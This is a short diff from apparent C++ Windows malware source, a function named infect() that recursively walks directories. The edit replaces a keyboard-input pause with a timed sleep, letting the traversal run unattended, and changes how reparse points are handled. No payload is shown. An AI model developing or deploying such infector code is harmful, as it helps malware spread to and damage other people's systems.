@@ -207,7 +207,7 @@ int infect(void)
       {
          std::wcout << "\t" << find_data.cFileName << std::endl;
          if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
-             (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) == 0)
+             (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
          {
             char slash[] = {'\\',0};
             char dot[] = {'.', 0};
@@ -243,8 +243,7 @@ int infect(void)
       free(search_string);
       free(search_visit);
 
-      std::string dummyInput;
-      std::cin >> dummyInput;
+      Sleep(1000);
    }
 
    return 0;
